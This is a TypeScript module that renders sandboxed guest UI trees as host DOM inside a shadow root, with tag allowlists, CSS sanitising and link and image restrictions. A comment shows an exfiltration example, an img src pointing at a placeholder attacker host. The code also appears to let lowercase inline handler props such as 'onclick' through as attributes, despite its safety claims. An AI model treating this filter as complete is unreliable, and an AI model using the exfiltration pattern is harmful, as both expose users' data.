/**
 * Host-side rendering for guest UI: the guest describes interface as DATA,
 * the host turns it into real DOM. The guest never touches the DOM itself
 * — that would break the sandbox's core promise — but a guest component
 * can still render visibly, because the host renders its element tree.
 *
 * How it works:
 * 1. Guest code builds an element tree (plain JSON data) and sends it with
 *    host.send, e.g. host.send(JSON.stringify({ kind: "render", tree })).
 *    Guest code may be authored as JSX and compiled by the APP's own
 *    toolchain into createElement-style calls before run(); the library
 *    ships no JSX compiler, keeping the worker bundle small.
 * 2. The app parses the message and calls renderGuestTree(container, tree).
 * 3. The tree renders inside a SHADOW root on the container, so guest
 *    styles cannot leak into the host page and host styles cannot leak in.
 * 4. Events round-trip: an element's onClick="inc" becomes a host listener
 *    that calls onEvent("inc"); the app forwards that to the guest with
 *    sandbox.send(...); the guest recomputes and sends a new tree.
 *
 * Safety rules, enforced here, not hoped for:
 * - No innerHTML anywhere: text children become text nodes, so a guest
 *   string can never become markup.
 * - A tag allowlist: no script, iframe, object, embed, link, meta, base,
 *   form, or style elements from the guest. Styles arrive only through the
 *   cssText argument, after sanitizeCss.
 * - No remote media: an <img> src must be a data: URL. A remote src would
 *   make the HOST page fetch a guest-chosen URL with no gate approval —
 *   an exfiltration channel (imagine <img src="https://evil.example/?x=...">).
 *   Remote images belong behind host.fetchText (and binary fetch is a
 *   follow-up; v1 fetchText returns text).
 * - Links: href must be http(s); javascript: and friends are dropped, and
 *   _blank links get rel="noopener". A link that ALSO carries an onClick
 *   event id does not navigate on click: the click is preventDefaulted
 *   and reported as an event, so the host decides (for example, by
 *   asking the user — a gated link). A link with no event id navigates
 *   normally; the app opts into gating by attaching a handler.
 * - Tree size is capped (depth 32, 5000 nodes) before any DOM is built.
 */

export type GuestNode =
  | string
  | number
  | {
      type: string;
      props?: Record<string, unknown>;
      children?: GuestNode[];
    };

export interface RenderOptions {
  /** Stylesheet text for the app (already guest-supplied, e.g. CDN CSS fetched via the gate). Sanitized before use. */
  cssText?: string;
  /** Called with the event id (and the element's value, for inputs) on guest UI events. */
  onEvent?: (id: string, value?: string) => void;
}

const MAX_TREE_DEPTH = 32;
const MAX_TREE_NODES = 5000;

const TAG_ALLOWLIST = new Set([
  "div", "span", "p", "h1", "h2", "h3", "h4", "h5", "h6",
  "button", "input", "select", "option", "textarea", "label",
  "a", "img", "ul", "ol", "li", "table", "thead", "tbody", "tr", "td", "th",
  "pre", "code", "strong", "em", "small", "br", "hr", "section", "article",
  "header", "footer", "nav", "main", "figure", "figcaption", "blockquote",
]);

const ATTR_MAP: Record<string, string> = {
  className: "class",
  htmlFor: "for",
  tabIndex: "tabindex",
  readOnly: "readonly",
  maxLength: "maxlength",
  colSpan: "colspan",
  rowSpan: "rowspan",
};

const EVENT_NAMES = new Set([
  "onClick", "onInput", "onChange", "onSubmit", "onFocus", "onBlur",
  "onKeyDown", "onKeyUp", "onMouseEnter", "onMouseLeave",
]);

const DOM_EVENT_MAP: Record<string, string> = {
  onClick: "click",
  onInput: "input",
  onChange: "change",
  onSubmit: "submit",
  onFocus: "focus",
  onBlur: "blur",
  onKeyDown: "keydown",
  onKeyUp: "keyup",
  onMouseEnter: "mouseenter",
  onMouseLeave: "mouseleave",
};

/**
 * Sanitize stylesheet text for application inside the guest's shadow root.
 * - Strips comments (which can hide payloads from naive filters).
 * - Removes @import rules entirely (any form — they load other sheets).
 * - Replaces url(...) with none (no fetch of any kind from guest CSS).
 * What survives is flat styling: selectors, colors, spacing, fonts already
 * present. This is deliberately conservative; a full CSS parser is a
 * follow-up if richer stylesheets are ever needed.
 */
export function sanitizeCss(cssText: string): string {
  if (typeof cssText !== "string") throw new Error("sanitizeCss: cssText must be a string");
  let out = cssText.replace(/\/\*[\s\S]*?\*\//g, "");
  out = out.replace(/@import[^;]*;?/gi, "");
  out = out.replace(/url\s*\([^)]*\)/gi, "none");
  return out;
}

/**
 * Sanitize one inline style value. A style object value is not a
 * stylesheet, so there is no @import to strip — but a url() in it would
 * still fetch, so it becomes none. (A style *string* prop goes through
 * sanitizeCss instead.)
 */
export function sanitizeStyleValue(value: string): string {
  return value.replace(/url\s*\([^)]*\)/gi, "none");
}

/**
 * Validate a guest tree's shape. Throws on anything malformed, unknown,
 * or over the caps. Pure (no DOM), so it is unit-testable in Node.
 */
export function validateTree(node: unknown): asserts node is GuestNode {
  let count = 0;
  const walk = (value: unknown, depth: number): void => {
    if (depth > MAX_TREE_DEPTH) throw new Error("guest tree exceeds max depth");
    count += 1;
    if (count > MAX_TREE_NODES) throw new Error("guest tree exceeds max nodes");
    if (typeof value === "string" || typeof value === "number") return;
    if (typeof value !== "object" || value === null || Array.isArray(value)) {
      throw new Error("guest tree node must be a string, number, or element object");
    }
    const record = value as Record<string, unknown>;
    if (typeof record["type"] !== "string" || !TAG_ALLOWLIST.has(record["type"])) {
      throw new Error(`guest tree: disallowed element type: ${String(record["type"])}`);
    }
    if (record["props"] !== undefined) {
      if (typeof record["props"] !== "object" || record["props"] === null || Array.isArray(record["props"])) {
        throw new Error("guest tree: props must be an object");
      }
      for (const [key, propValue] of Object.entries(record["props"] as Record<string, unknown>)) {
        if (EVENT_NAMES.has(key)) {
          if (typeof propValue !== "string") {
            throw new Error(`guest tree: event prop ${key} must be a string event id`);
          }
          continue;
        }
        if (key === "style") {
          if (typeof propValue !== "string" && (typeof propValue !== "object" || propValue === null)) {
            throw new Error("guest tree: style must be a string or an object");
          }
          continue;
        }
        if (
          typeof propValue !== "string" &&
          typeof propValue !== "number" &&
          typeof propValue !== "boolean"
        ) {
          throw new Error(`guest tree: prop ${key} must be a string, number, or boolean`);
        }
      }
    }
    if (record["children"] !== undefined) {
      if (!Array.isArray(record["children"])) {
        throw new Error("guest tree: children must be an array");
      }
      for (const child of record["children"]) walk(child, depth + 1);
    }
  };
  walk(node, 0);
}

/**
 * Render a validated guest tree into a shadow root on the container.
 * Clears any previous guest UI first (full re-render per tree; the guest
 * re-sends its whole tree after each event). Returns the shadow root.
 */
export function renderGuestTree(
  container: HTMLElement,
  tree: unknown,
  options: RenderOptions = {},
): ShadowRoot {
  validateTree(tree);
  const doc = container.ownerDocument;
  const shadow = container.shadowRoot ?? container.attachShadow({ mode: "open" });
  while (shadow.firstChild !== null) shadow.removeChild(shadow.firstChild);
  if (options.cssText !== undefined) {
    const style = doc.createElement("style");
    style.textContent = sanitizeCss(options.cssText);
    shadow.appendChild(style);
  }
  shadow.appendChild(buildNode(doc, tree, options.onEvent));
  return shadow;
}

/**
 * Map a guest prop name to a DOM attribute name. This must NOT index
 * ATTR_MAP directly with the guest-controlled key: ATTR_MAP["__proto__"]
 * resolves to Object.prototype through the prototype chain (not
 * undefined), which setAttribute then coerces to "[object Object]" and
 * rejects. The hasOwnProperty guard keeps attacker-controlled keys from
 * ever resolving through the prototype.
 */
function attrName(key: string): string {
  return Object.prototype.hasOwnProperty.call(ATTR_MAP, key)
    ? (ATTR_MAP[key] as string)
    : key.toLowerCase();
}

function buildNode(
  doc: Document,
  node: GuestNode,
  onEvent: RenderOptions["onEvent"],
): Node {
  if (typeof node === "string" || typeof node === "number") {
    return doc.createTextNode(String(node));
  }
  const el = doc.createElement(node.type);
  const props = node.props ?? {};
  for (const [key, value] of Object.entries(props)) {
    if (EVENT_NAMES.has(key) && typeof value === "string") {
      const domEvent = DOM_EVENT_MAP[key];
      if (domEvent === undefined) continue;
      const id = value;
      el.addEventListener(domEvent, (event) => {
        // A gated link: the host decides what a click does (approve and
        // open, or ignore). Without this, the browser would navigate on
        // click before the host had any say.
        if (el.tagName === "A" && domEvent === "click") event.preventDefault();
        // Only form elements report a value; a button's empty-string value
        // would be noise.
        let elementValue: string | undefined;
        if (
          el instanceof HTMLInputElement ||
          el instanceof HTMLSelectElement ||
          el instanceof HTMLTextAreaElement
        ) {
          elementValue = el.value;
        }
        onEvent?.(id, elementValue);
      });
      continue;
    }
    if (key === "style") {
      if (typeof value === "string") {
        el.setAttribute("style", sanitizeCss(value));
      } else if (typeof value === "object" && value !== null) {
        const parts: string[] = [];
        for (const [prop, propValue] of Object.entries(value as Record<string, unknown>)) {
          if (!/^[a-z-]+$/i.test(prop)) continue;
          if (typeof propValue !== "string" && typeof propValue !== "number") continue;
          // Values are sanitized like stylesheet text: a url() here would
          // fetch from the host page with no gate approval.
          const clean =
            typeof propValue === "string" ? sanitizeStyleValue(propValue) : String(propValue);
          parts.push(`${prop}: ${clean}`);
        }
        el.setAttribute("style", parts.join("; "));
      }
      continue;
    }
    if (key === "href") {
      if (typeof value === "string" && /^(https?:)/i.test(value)) {
        el.setAttribute("href", value);
        if ((props["target"] as string) === "_blank") el.setAttribute("rel", "noopener");
      }
      continue;
    }
    if (key === "src") {
      // Data URLs only: a remote src would fetch from the host page with
      // no gate approval. See the module comment.
      if (typeof value === "string" && value.startsWith("data:")) {
        el.setAttribute("src", value);
      }
      continue;
    }
    if (key === "value" && (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement || el instanceof HTMLSelectElement)) {
      el.value = String(value);
      continue;
    }
    if (key === "checked" && el instanceof HTMLInputElement) {
      el.checked = value === true;
      continue;
    }
    if (typeof value === "boolean") {
      if (value) el.setAttribute(attrName(key), "");
      continue;
    }
    if (typeof value === "string" || typeof value === "number") {
      el.setAttribute(attrName(key), String(value));
    }
  }
  for (const child of node.children ?? []) {
    el.appendChild(buildNode(doc, child, onEvent));
  }
  return el;
}
